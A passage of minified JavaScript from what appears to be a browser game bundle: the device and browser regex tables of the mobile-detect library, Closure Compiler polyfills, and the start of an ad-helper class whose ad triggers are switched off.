I720|TAB T76|TAB R70|TAB R76.2|TAB R106|TAB R83.2|TAB M813G|TAB I721|GCTA722|TAB I70|TAB I71|TAB S73|TAB R73|TAB R74|TAB R93|TAB R75|TAB R76.1|TAB A73|TAB A93|TAB A93.2|TAB T72|TAB R83|TAB R974|TAB R973|TAB A101|TAB A103|TAB A104|TAB A104.2|R105BK|M713G|A972BK|TAB A971|TAB R974.2|TAB R104|TAB R83.3|TAB A1042",ModecomTablet:"FreeTAB 9000|FreeTAB 7.4|FreeTAB 7004|FreeTAB 7800|FreeTAB 2096|FreeTAB 7.5|FreeTAB 1014|FreeTAB 1001 |FreeTAB 8001|FreeTAB 9706|FreeTAB 9702|FreeTAB 7003|FreeTAB 7002|FreeTAB 1002|FreeTAB 7801|FreeTAB 1331|FreeTAB 1004|FreeTAB 8002|FreeTAB 8014|FreeTAB 9704|FreeTAB 1003",VoninoTablet:"\\b(Argus[ _]?S|Diamond[ _]?79HD|Emerald[ _]?78E|Luna[ _]?70C|Onyx[ _]?S|Onyx[ _]?Z|Orin[ _]?HD|Orin[ _]?S|Otis[ _]?S|SpeedStar[ _]?S|Magnet[ _]?M9|Primus[ _]?94[ _]?3G|Primus[ _]?94HD|Primus[ _]?QS|Android.*\\bQ8\\b|Sirius[ _]?EVO[ _]?QS|Sirius[ _]?QS|Spirit[ _]?S)\\b",ECSTablet:"V07OT2|TM105A|S10OT1|TR10CS1",StorexTablet:"eZee[_']?(Tab|Go)[0-9]+|TabLC7|Looney Tunes Tab",VodafoneTablet:"SmartTab([ ]+)?[0-9]+|SmartTabII10|SmartTabII7|VF-1497|VFD 1400",EssentielBTablet:"Smart[ ']?TAB[ ]+?[0-9]+|Family[ ']?TAB2",RossMoorTablet:"RM-790|RM-997|RMD-878G|RMD-974R|RMT-705A|RMT-701|RME-601|RMT-501|RMT-711",iMobileTablet:"i-mobile i-note",TolinoTablet:"tolino tab [0-9.]+|tolino shine",AudioSonicTablet:"\\bC-22Q|T7-QC|T-17B|T-17P\\b",AMPETablet:"Android.* A78 ",SkkTablet:"Android.* (SKYPAD|PHOENIX|CYCLOPS)",TecnoTablet:"TECNO P9|TECNO DP8D",JXDTablet:"Android.* \\b(F3000|A3300|JXD5000|JXD3000|JXD2000|JXD300B|JXD300|S5800|S7800|S602b|S5110b|S7300|S5300|S602|S603|S5100|S5110|S601|S7100a|P3000F|P3000s|P101|P200s|P1000m|P200m|P9100|P1000s|S6600b|S908|P1000|P300|S18|S6600|S9100)\\b",iJoyTablet:"Tablet (Spirit 7|Essentia|Galatea|Fusion|Onix 7|Landa|Titan|Scooby|Deox|Stella|Themis|Argon|Unique 7|Sygnus|Hexen|Finity 7|Cream|Cream X2|Jade|Neon 7|Neron 7|Kandy|Scape|Saphyr 7|Rebel|Biox|Rebel|Rebel 8GB|Myst|Draco 7|Myst|Tab7-004|Myst|Tadeo Jones|Tablet Boing|Arrow|Draco Dual Cam|Aurix|Mint|Amity|Revolution|Finity 9|Neon 9|T9w|Amity 4GB Dual Cam|Stone 4GB|Stone 8GB|Andromeda|Silken|X2|Andromeda II|Halley|Flame|Saphyr 9,7|Touch 8|Planet|Triton|Unique 10|Hexen 10|Memphis 4GB|Memphis 8GB|Onix 10)",FX2Tablet:"FX2 PAD7|FX2 PAD10",XoroTablet:"KidsPAD 701|PAD[ ]?712|PAD[ ]?714|PAD[ ]?716|PAD[ ]?717|PAD[ ]?718|PAD[ ]?720|PAD[ ]?721|PAD[ ]?722|PAD[ ]?790|PAD[ ]?792|PAD[ ]?900|PAD[ ]?9715D|PAD[ ]?9716DR|PAD[ ]?9718DR|PAD[ ]?9719QR|PAD[ ]?9720QR|TelePAD1030|Telepad1032|TelePAD730|TelePAD731|TelePAD732|TelePAD735Q|TelePAD830|TelePAD9730|TelePAD795|MegaPAD 1331|MegaPAD 1851|MegaPAD 2151",ViewsonicTablet:"ViewPad 10pi|ViewPad 10e|ViewPad 10s|ViewPad E72|ViewPad7|ViewPad E100|ViewPad 7e|ViewSonic VB733|VB100a",VerizonTablet:"QTAQZ3|QTAIR7|QTAQTZ3|QTASUN1|QTASUN2|QTAXIA1",OdysTablet:"LOOX|XENO10|ODYS[ -](Space|EVO|Xpress|NOON)|\\bXELIO\\b|Xelio10Pro|XELIO7PHONETAB|XELIO10EXTREME|XELIOPT2|NEO_QUAD10",CaptivaTablet:"CAPTIVA PAD",IconbitTablet:"NetTAB|NT-3702|NT-3702S|NT-3702S|NT-3603P|NT-3603P|NT-0704S|NT-0704S|NT-3805C|NT-3805C|NT-0806C|NT-0806C|NT-0909T|NT-0909T|NT-0907S|NT-0907S|NT-0902S|NT-0902S",TeclastTablet:"T98 4G|\\bP80\\b|\\bX90HD\\b|X98 Air|X98 Air 3G|\\bX89\\b|P80 3G|\\bX80h\\b|P98 Air|\\bX89HD\\b|P98 3G|\\bP90HD\\b|P89 3G|X98 3G|\\bP70h\\b|P79HD 3G|G18d 3G|\\bP79HD\\b|\\bP89s\\b|\\bA88\\b|\\bP10HD\\b|\\bP19HD\\b|G18 3G|\\bP78HD\\b|\\bA78\\b|\\bP75\\b|G17s 3G|G17h 3G|\\bP85t\\b|\\bP90\\b|\\bP11\\b|\\bP98t\\b|\\bP98HD\\b|\\bG18d\\b|\\bP85s\\b|\\bP11HD\\b|\\bP88s\\b|\\bA80HD\\b|\\bA80se\\b|\\bA10h\\b|\\bP89\\b|\\bP78s\\b|\\bG18\\b|\\bP85\\b|\\bA70h\\b|\\bA70\\b|\\bG17\\b|\\bP18\\b|\\bA80s\\b|\\bA11s\\b|\\bP88HD\\b|\\bA80h\\b|\\bP76s\\b|\\bP76h\\b|\\bP98\\b|\\bA10HD\\b|\\bP78\\b|\\bP88\\b|\\bA11\\b|\\bA10t\\b|\\bP76a\\b|\\bP76t\\b|\\bP76e\\b|\\bP85HD\\b|\\bP85a\\b|\\bP86\\b|\\bP75HD\\b|\\bP76v\\b|\\bA12\\b|\\bP75a\\b|\\bA15\\b|\\bP76Ti\\b|\\bP81HD\\b|\\bA10\\b|\\bT760VE\\b|\\bT720HD\\b|\\bP76\\b|\\bP73\\b|\\bP71\\b|\\bP72\\b|\\bT720SE\\b|\\bC520Ti\\b|\\bT760\\b|\\bT720VE\\b|T720-3GE|T720-WiFi",OndaTablet:"\\b(V975i|Vi30|VX530|V701|Vi60|V701s|Vi50|V801s|V719|Vx610w|VX610W|V819i|Vi10|VX580W|Vi10|V711s|V813|V811|V820w|V820|Vi20|V711|VI30W|V712|V891w|V972|V819w|V820w|Vi60|V820w|V711|V813s|V801|V819|V975s|V801|V819|V819|V818|V811|V712|V975m|V101w|V961w|V812|V818|V971|V971s|V919|V989|V116w|V102w|V973|Vi40)\\b[\\s]+|V10 \\b4G\\b",JaytechTablet:"TPC-PA762",BlaupunktTablet:"Endeavour 800NG|Endeavour 1010",DigmaTablet:"\\b(iDx10|iDx9|iDx8|iDx7|iDxD7|iDxD8|iDsQ8|iDsQ7|iDsQ8|iDsD10|iDnD7|3TS804H|iDsQ11|iDj7|iDs10)\\b",EvolioTablet:"ARIA_Mini_wifi|Aria[ _]Mini|Evolio X10|Evolio X7|Evolio X8|\\bEvotab\\b|\\bNeura\\b",LavaTablet:"QPAD E704|\\bIvoryS\\b|E-TAB IVORY|\\bE-TAB\\b",AocTablet:"MW0811|MW0812|MW0922|MTK8382|MW1031|MW0831|MW0821|MW0931|MW0712",MpmanTablet:"MP11 OCTA|MP10 OCTA|MPQC1114|MPQC1004|MPQC994|MPQC974|MPQC973|MPQC804|MPQC784|MPQC780|\\bMPG7\\b|MPDCG75|MPDCG71|MPDC1006|MP101DC|MPDC9000|MPDC905|MPDC706HD|MPDC706|MPDC705|MPDC110|MPDC100|MPDC99|MPDC97|MPDC88|MPDC8|MPDC77|MP709|MID701|MID711|MID170|MPDC703|MPQC1010",CelkonTablet:"CT695|CT888|CT[\\s]?910|CT7 Tab|CT9 Tab|CT3 Tab|CT2 Tab|CT1 Tab|C820|C720|\\bCT-1\\b",WolderTablet:"miTab \\b(DIAMOND|SPACE|BROOKLYN|NEO|FLY|MANHATTAN|FUNK|EVOLUTION|SKY|GOCAR|IRON|GENIUS|POP|MINT|EPSILON|BROADWAY|JUMP|HOP|LEGEND|NEW AGE|LINE|ADVANCE|FEEL|FOLLOW|LIKE|LINK|LIVE|THINK|FREEDOM|CHICAGO|CLEVELAND|BALTIMORE-GH|IOWA|BOSTON|SEATTLE|PHOENIX|DALLAS|IN 101|MasterChef)\\b",MediacomTablet:"M-MPI10C3G|M-SP10EG|M-SP10EGP|M-SP10HXAH|M-SP7HXAH|M-SP10HXBH|M-SP8HXAH|M-SP8MXA",MiTablet:"\\bMI PAD\\b|\\bHM NOTE 1W\\b",NibiruTablet:"Nibiru M1|Nibiru Jupiter One",NexoTablet:"NEXO NOVA|NEXO 10|NEXO AVIO|NEXO FREE|NEXO GO|NEXO EVO|NEXO 3G|NEXO SMART|NEXO KIDDO|NEXO MOBI",LeaderTablet:"TBLT10Q|TBLT10I|TBL-10WDKB|TBL-10WDKBO2013|TBL-W230V2|TBL-W450|TBL-W500|SV572|TBLT7I|TBA-AC7-8G|TBLT79|TBL-8W16|TBL-10W32|TBL-10WKB|TBL-W100",UbislateTablet:"UbiSlate[\\s]?7C",PocketBookTablet:"Pocketbook",KocasoTablet:"\\b(TB-1207)\\b",HisenseTablet:"\\b(F5281|E2371)\\b",Hudl:"Hudl HT7S3|Hudl 2",TelstraTablet:"T-Hub2",GenericTablet:"Android.*\\b97D\\b|Tablet(?!.*PC)|BNTV250A|MID-WCDMA|LogicPD Zoom2|\\bA7EB\\b|CatNova8|A1_07|CT704|CT1002|\\bM721\\b|rk30sdk|\\bEVOTAB\\b|M758A|ET904|ALUMIUM10|Smartfren Tab|Endeavour 1010|Tablet-PC-4|Tagi Tab|\\bM6pro\\b|CT1020W|arc 10HD|\\bTP750\\b|\\bQTAQZ3\\b|WVT101|TM1088|KT107"},oss:{AndroidOS:"Android",BlackBerryOS:"blackberry|\\bBB10\\b|rim tablet os",PalmOS:"PalmOS|avantgo|blazer|elaine|hiptop|palm|plucker|xiino",SymbianOS:"Symbian|SymbOS|Series60|Series40|SYB-[0-9]+|\\bS60\\b",WindowsMobileOS:"Windows CE.*(PPC|Smartphone|Mobile|[0-9]{3}x[0-9]{3})|Windows Mobile|Windows Phone [0-9.]+|WCE;",WindowsPhoneOS:"Windows Phone 10.0|Windows Phone 8.1|Windows Phone 8.0|Windows Phone OS|XBLWP7|ZuneWP7|Windows NT 6.[23]; ARM;",iOS:"\\biPhone.*Mobile|\\biPod|\\biPad|AppleCoreMedia",iPadOS:"CPU OS 13",SailfishOS:"Sailfish",MeeGoOS:"MeeGo",MaemoOS:"Maemo",JavaOS:"J2ME/|\\bMIDP\\b|\\bCLDC\\b",webOS:"webOS|hpwOS",badaOS:"\\bBada\\b",BREWOS:"BREW"},uas:{Chrome:"\\bCrMo\\b|CriOS|Android.*Chrome/[.0-9]* (Mobile)?",Dolfin:"\\bDolfin\\b",Opera:"Opera.*Mini|Opera.*Mobi|Android.*Opera|Mobile.*OPR/[0-9.]+$|Coast/[0-9.]+",Skyfire:"Skyfire",Edge:"\\bEdgiOS\\b|Mobile Safari/[.0-9]* Edge",IE:"IEMobile|MSIEMobile",Firefox:"fennec|firefox.*maemo|(Mobile|Tablet).*Firefox|Firefox.*Mobile|FxiOS",Bolt:"bolt",TeaShark:"teashark",Blazer:"Blazer",Safari:"Version((?!\\bEdgiOS\\b).)*Mobile.*Safari|Safari.*Mobile|MobileSafari",WeChat:"\\bMicroMessenger\\b",UCBrowser:"UC.*Browser|UCWEB",baiduboxapp:"baiduboxapp",baidubrowser:"baidubrowser",DiigoBrowser:"DiigoBrowser",Mercury:"\\bMercury\\b",ObigoBrowser:"Obigo",NetFront:"NF-Browser",GenericBrowser:"NokiaBrowser|OviBrowser|OneBrowser|TwonkyBeamBrowser|SEMC.*Browser|FlyFlow|Minimo|NetFront|Novarra-Vision|MQQBrowser|MicroMessenger",PaleMoon:"Android.*PaleMoon|Mobile.*PaleMoon"},props:{Mobile:"Mobile/[VER]",Build:"Build/[VER]",Version:"Version/[VER]",VendorID:"VendorID/[VER]",iPad:"iPad.*CPU[a-z ]+[VER]",iPhone:"iPhone.*CPU[a-z ]+[VER]",iPod:"iPod.*CPU[a-z ]+[VER]",Kindle:"Kindle/[VER]",Chrome:["Chrome/[VER]","CriOS/[VER]","CrMo/[VER]"],Coast:["Coast/[VER]"],Dolfin:"Dolfin/[VER]",Firefox:["Firefox/[VER]","FxiOS/[VER]"],Fennec:"Fennec/[VER]",Edge:"Edge/[VER]",IE:["IEMobile/[VER];","IEMobile [VER]","MSIE [VER];","Trident/[0-9.]+;.*rv:[VER]"],NetFront:"NetFront/[VER]",NokiaBrowser:"NokiaBrowser/[VER]",Opera:[" OPR/[VER]","Opera Mini/[VER]","Version/[VER]"],"Opera Mini":"Opera Mini/[VER]","Opera Mobi":"Version/[VER]",UCBrowser:["UCWEB[VER]","UC.*Browser/[VER]"],MQQBrowser:"MQQBrowser/[VER]",MicroMessenger:"MicroMessenger/[VER]",baiduboxapp:"baiduboxapp/[VER]",baidubrowser:"baidubrowser/[VER]",SamsungBrowser:"SamsungBrowser/[VER]",Iron:"Iron/[VER]",Safari:["Version/[VER]","Safari/[VER]"],Skyfire:"Skyfire/[VER]",Tizen:"Tizen/[VER]",Webkit:"webkit[ /][VER]",PaleMoon:"PaleMoon/[VER]",SailfishBrowser:"SailfishBrowser/[VER]",Gecko:"Gecko/[VER]",Trident:"Trident/[VER]",Presto:"Presto/[VER]",Goanna:"Goanna/[VER]",iOS:" \\bi?OS\\b [VER][ ;]{1}",Android:"Android [VER]",Sailfish:"Sailfish [VER]",BlackBerry:["BlackBerry[\\w]+/[VER]","BlackBerry.*Version/[VER]","Version/[VER]"],BREW:"BREW [VER]",Java:"Java/[VER]","Windows Phone OS":["Windows Phone OS [VER]","Windows Phone [VER]"],"Windows Phone":"Windows Phone [VER]","Windows CE":"Windows CE/[VER]","Windows NT":"Windows NT [VER]",Symbian:["SymbianOS/[VER]","Symbian/[VER]"],webOS:["webOS/[VER]","hpwOS/[VER];"]},utils:{Bot:"Googlebot|facebookexternalhit|Google-AMPHTML|s~amp-validator|AdsBot-Google|Google Keyword Suggestion|Facebot|YandexBot|YandexMobileBot|bingbot|ia_archiver|AhrefsBot|Ezooms|GSLFbot|WBSearchBot|Twitterbot|TweetmemeBot|Twikle|PaperLiBot|Wotbox|UnwindFetchor|Exabot|MJ12bot|YandexImages|TurnitinBot|Pingdom|contentkingapp|AspiegelBot",MobileBot:"Googlebot-Mobile|AdsBot-Google-Mobile|YahooSeeker/M1A1-R2D2",DesktopMode:"WPDesktop",TV:"SonyDTV|HbbTV",WebKit:"(webkit)[ /]([\\w.]+)",Console:"\\b(Nintendo|Nintendo WiiU|Nintendo 3DS|Nintendo Switch|PLAYSTATION|Xbox)\\b",Watch:"SM-V700"}},g.detectMobileBrowsers={fullPattern:/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i,
shortPattern:/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i,tabletPattern:/android|ipad|playbook|silk/i};var h,i=Object.prototype.hasOwnProperty;return g.FALLBACK_PHONE="UnknownPhone",g.FALLBACK_TABLET="UnknownTablet",g.FALLBACK_MOBILE="UnknownMobile",h="isArray"in Array?Array.isArray:function(a){return"[object Array]"===Object.prototype.toString.call(a)},function(){var a,b,c,e,f,j,k=g.mobileDetectRules;for(a in k.props)if(i.call(k.props,a)){for(b=k.props[a],h(b)||(b=[b]),f=b.length,e=0;e<f;++e)c=b[e],j=c.indexOf("[VER]"),j>=0&&(c=c.substring(0,j)+"([\\w._\\+]+)"+c.substring(j+5)),b[e]=new RegExp(c,"i");k.props[a]=b}d(k.oss),d(k.phones),d(k.tablets),d(k.uas),d(k.utils),k.oss0={WindowsPhoneOS:k.oss.WindowsPhoneOS,WindowsMobileOS:k.oss.WindowsMobileOS}}(),g.findMatch=function(a,b){for(var c in a)if(i.call(a,c)&&a[c].test(b))return c;return null},g.findMatches=function(a,b){var c=[];for(var d in a)i.call(a,d)&&a[d].test(b)&&c.push(d);return c},g.getVersionStr=function(a,b){var c,d,e,f,h=g.mobileDetectRules.props;if(i.call(h,a))for(c=h[a],e=c.length,d=0;d<e;++d)if(f=c[d].exec(b),null!==f)return f[1];return null},g.getVersion=function(a,b){var c=g.getVersionStr(a,b);return c?g.prepareVersionNo(c):NaN},g.prepareVersionNo=function(a){var b;return b=a.split(/[a-z._ \/\-]/i),1===b.length&&(a=b[0]),b.length>1&&(a=b[0]+".",b.shift(),a+=b.join("")),Number(a)},g.isMobileFallback=function(a){return g.detectMobileBrowsers.fullPattern.test(a)||g.detectMobileBrowsers.shortPattern.test(a.substr(0,4))},g.isTabletFallback=function(a){return g.detectMobileBrowsers.tabletPattern.test(a)},g.prepareDetectionCache=function(a,c,d){if(a.mobile===b){var e,h,i;return(h=g.findMatch(g.mobileDetectRules.tablets,c))?(a.mobile=a.tablet=h,void(a.phone=null)):(e=g.findMatch(g.mobileDetectRules.phones,c))?(a.mobile=a.phone=e,void(a.tablet=null)):void(g.isMobileFallback(c)?(i=f.isPhoneSized(d),i===b?(a.mobile=g.FALLBACK_MOBILE,a.tablet=a.phone=null):i?(a.mobile=a.phone=g.FALLBACK_PHONE,a.tablet=null):(a.mobile=a.tablet=g.FALLBACK_TABLET,a.phone=null)):g.isTabletFallback(c)?(a.mobile=a.tablet=g.FALLBACK_TABLET,a.phone=null):a.mobile=a.tablet=a.phone=null)}},g.mobileGrade=function(a){var b=null!==a.mobile();return a.os("iOS")&&a.version("iPad")>=4.3||a.os("iOS")&&a.version("iPhone")>=3.1||a.os("iOS")&&a.version("iPod")>=3.1||a.version("Android")>2.1&&a.is("Webkit")||a.version("Windows Phone OS")>=7||a.is("BlackBerry")&&a.version("BlackBerry")>=6||a.match("Playbook.*Tablet")||a.version("webOS")>=1.4&&a.match("Palm|Pre|Pixi")||a.match("hp.*TouchPad")||a.is("Firefox")&&a.version("Firefox")>=12||a.is("Chrome")&&a.is("AndroidOS")&&a.version("Android")>=4||a.is("Skyfire")&&a.version("Skyfire")>=4.1&&a.is("AndroidOS")&&a.version("Android")>=2.3||a.is("Opera")&&a.version("Opera Mobi")>11&&a.is("AndroidOS")||a.is("MeeGoOS")||a.is("Tizen")||a.is("Dolfin")&&a.version("Bada")>=2||(a.is("UC Browser")||a.is("Dolfin"))&&a.version("Android")>=2.3||a.match("Kindle Fire")||a.is("Kindle")&&a.version("Kindle")>=3||a.is("AndroidOS")&&a.is("NookTablet")||a.version("Chrome")>=11&&!b||a.version("Safari")>=5&&!b||a.version("Firefox")>=4&&!b||a.version("MSIE")>=7&&!b||a.version("Opera")>=10&&!b?"A":a.os("iOS")&&a.version("iPad")<4.3||a.os("iOS")&&a.version("iPhone")<3.1||a.os("iOS")&&a.version("iPod")<3.1||a.is("Blackberry")&&a.version("BlackBerry")>=5&&a.version("BlackBerry")<6||a.version("Opera Mini")>=5&&a.version("Opera Mini")<=6.5&&(a.version("Android")>=2.3||a.is("iOS"))||a.match("NokiaN8|NokiaC7|N97.*Series60|Symbian/3")||a.version("Opera Mobi")>=11&&a.is("SymbianOS")?"B":(a.version("BlackBerry")<5||a.match("MSIEMobile|Windows CE.*Mobile")||a.version("Windows Mobile")<=5.2,"C")},g.detectOS=function(a){return g.findMatch(g.mobileDetectRules.oss0,a)||g.findMatch(g.mobileDetectRules.oss,a)},g.getDeviceSmallerSide=function(){return window.screen.width<window.screen.height?window.screen.width:window.screen.height},f.prototype={constructor:f,mobile:function(){return g.prepareDetectionCache(this._cache,this.ua,this.maxPhoneWidth),this._cache.mobile},phone:function(){return g.prepareDetectionCache(this._cache,this.ua,this.maxPhoneWidth),this._cache.phone},tablet:function(){return g.prepareDetectionCache(this._cache,this.ua,this.maxPhoneWidth),this._cache.tablet},userAgent:function(){return this._cache.userAgent===b&&(this._cache.userAgent=g.findMatch(g.mobileDetectRules.uas,this.ua)),this._cache.userAgent},userAgents:function(){return this._cache.userAgents===b&&(this._cache.userAgents=g.findMatches(g.mobileDetectRules.uas,this.ua)),this._cache.userAgents},os:function(){return this._cache.os===b&&(this._cache.os=g.detectOS(this.ua)),this._cache.os},version:function(a){return g.getVersion(a,this.ua)},versionStr:function(a){return g.getVersionStr(a,this.ua)},is:function(b){return c(this.userAgents(),b)||a(b,this.os())||a(b,this.phone())||a(b,this.tablet())||c(g.findMatches(g.mobileDetectRules.utils,this.ua),b)},match:function(a){return a instanceof RegExp||(a=new RegExp(a,"i")),a.test(this.ua)},isPhoneSized:function(a){return f.isPhoneSized(a||this.maxPhoneWidth)},mobileGrade:function(){return this._cache.grade===b&&(this._cache.grade=g.mobileGrade(this)),this._cache.grade}},"undefined"!=typeof window&&window.screen?f.isPhoneSized=function(a){return a<0?b:g.getDeviceSmallerSide()<=a}:f.isPhoneSized=function(){},f._impl=g,f.version="1.4.5 2021-03-13",f})}(function(a){if("undefined"!=typeof module&&module.exports)return function(a){module.exports=a()};if("function"==typeof define&&define.amd)return define;if("undefined"!=typeof window)return function(a){window.MobileDetect=a()};throw new Error("unknown environment")}());
var $jscomp=$jscomp||{};$jscomp.scope={};$jscomp.ASSUME_ES5=!1;$jscomp.ASSUME_NO_NATIVE_MAP=!1;$jscomp.ASSUME_NO_NATIVE_SET=!1;$jscomp.SIMPLE_FROUND_POLYFILL=!1;$jscomp.ISOLATE_POLYFILLS=!1;$jscomp.FORCE_POLYFILL_PROMISE=!1;$jscomp.FORCE_POLYFILL_PROMISE_WHEN_NO_UNHANDLED_REJECTION=!1;$jscomp.defineProperty=$jscomp.ASSUME_ES5||"function"==typeof Object.defineProperties?Object.defineProperty:function(a,b,e){if(a==Array.prototype||a==Object.prototype)return a;a[b]=e.value;return a};
$jscomp.getGlobal=function(a){a=["object"==typeof globalThis&&globalThis,a,"object"==typeof window&&window,"object"==typeof self&&self,"object"==typeof global&&global];for(var b=0;b<a.length;++b){var e=a[b];if(e&&e.Math==Math)return e}throw Error("Cannot find global object");};$jscomp.global=$jscomp.getGlobal(this);$jscomp.IS_SYMBOL_NATIVE="function"===typeof Symbol&&"symbol"===typeof Symbol("x");$jscomp.TRUST_ES6_POLYFILLS=!$jscomp.ISOLATE_POLYFILLS||$jscomp.IS_SYMBOL_NATIVE;$jscomp.polyfills={};
$jscomp.propertyToPolyfillSymbol={};$jscomp.POLYFILL_PREFIX="$jscp$";var $jscomp$lookupPolyfilledValue=function(a,b){var e=$jscomp.propertyToPolyfillSymbol[b];if(null==e)return a[b];e=a[e];return void 0!==e?e:a[b]};$jscomp.polyfill=function(a,b,e,f){b&&($jscomp.ISOLATE_POLYFILLS?$jscomp.polyfillIsolated(a,b,e,f):$jscomp.polyfillUnisolated(a,b,e,f))};
$jscomp.polyfillUnisolated=function(a,b,e,f){e=$jscomp.global;a=a.split(".");for(f=0;f<a.length-1;f++){var h=a[f];if(!(h in e))return;e=e[h]}a=a[a.length-1];f=e[a];b=b(f);b!=f&&null!=b&&$jscomp.defineProperty(e,a,{configurable:!0,writable:!0,value:b})};
$jscomp.polyfillIsolated=function(a,b,e,f){var h=a.split(".");a=1===h.length;f=h[0];f=!a&&f in $jscomp.polyfills?$jscomp.polyfills:$jscomp.global;for(var m=0;m<h.length-1;m++){var k=h[m];if(!(k in f))return;f=f[k]}h=h[h.length-1];e=$jscomp.IS_SYMBOL_NATIVE&&"es6"===e?f[h]:null;b=b(e);null!=b&&(a?$jscomp.defineProperty($jscomp.polyfills,h,{configurable:!0,writable:!0,value:b}):b!==e&&(void 0===$jscomp.propertyToPolyfillSymbol[h]&&(e=1E9*Math.random()>>>0,$jscomp.propertyToPolyfillSymbol[h]=$jscomp.IS_SYMBOL_NATIVE?
$jscomp.global.Symbol(h):$jscomp.POLYFILL_PREFIX+e+"$"+h),$jscomp.defineProperty(f,$jscomp.propertyToPolyfillSymbol[h],{configurable:!0,writable:!0,value:b})))};
$jscomp.polyfill("String.prototype.replaceAll",function(a){return a?a:function(b,e){if(b instanceof RegExp&&!b.global)throw new TypeError("String.prototype.replaceAll called with a non-global RegExp argument.");return b instanceof RegExp?this.replace(b,e):this.replace(new RegExp(String(b).replace(/([-()\[\]{}+?*.$\^|,:#<!\\])/g,"\\$1").replace(/\x08/g,"\\x08"),"g"),e)}},"es_2021","es3");inlModule={VERSION:"0.9",ads:null,game:null,rewardAds:null};
/* standalone-clean build: ad triggers and rewarded ads remain disabled */ const AD_TYPES={PREROLL:"preroll",GAME_LOADED:"gameloaded",GAME_START:"gamestart",GAME_OVER:"gameover"},adsConfig={enabled:!1,cooldownTimer:9E4,firstAdDelay:3E4,afkTimer:0,test:!1,autoAdSuccessful:!0,enableTriggerPoints:!1},gameConfig={removeGameInit:!1,fullscreenAllowed:!0,inlLogoAllowed:!1,cheatVersion:!1},rewAdsConfig={active:!1,test:!1};
class AdHelper{constructor(a){this.config=a;this.lastAdTime=null;this.enabled=a.enabled;this.enableTriggerPoints=a.enableTriggerPoints;this.config.test&&showToast("TEST INTERSTITIAL ADS ALLOWED");0<this.config.afkTimer&&(3E4>this.config.afkTimer&&console.warn("Afk timer is probably very low"),this._initAfkAd());0<this.config.firstAdDelay&&this._enableFirstAdDelay()}_enableFirstAdDelay(a=this.config.firstAdDelay){this.startTime=Date.now();this.config.firstAdDelay=a}triggerAdPoint(a){0!=this.enableTriggerPoints&&
(null==a&&(a={}),null==a.adType&&(a.adType="default"),inlogicLog("Trigger point. Type: "+a.adType),this._canAdBeShown(a)&&this._showAd(a))}triggerCustomAdPoint(a){null==a&&(a={});null==a.adType&&(a.adType="default");inlogicLog("Custom Trigger point. Type: "+a.adType);this._showAd(a)}_showAd(a){0!=this.config.enabled&&(this.config.test&&this.showFakeAd(),this.config.autoAdSuccessful&&this.adSuccessful(a))}adSuccessful(a){inlogicLog("Ad succesfuly watched");this.lastAdTime=Date.now()}_canAdBeShown(a){return!1===
this.enabled?!1:0<this.config.firstAdDelay&&(a=Date.now()-this.startTime,a<this.config.firstAdDelay)?(inlogicLog((this.config.firstAdDelay-a)/1E3+" seconds remaining to show first ad from start"),!1):0<this.config.cooldownTimer&&(a=Date.now()-this.lastAdTime,a<this.config.cooldownTimer)?(inlogicLog((this.config.cooldownTimer-a)/1E3+" seconds remaining from AD Cooldown"),!1):!0}_retryAfkAd(){inlogicLog("Attempting AFK ad...");"visible"==document.visibilityState&&this.triggerAdPoint({type:"afk"});this.afkTimer=
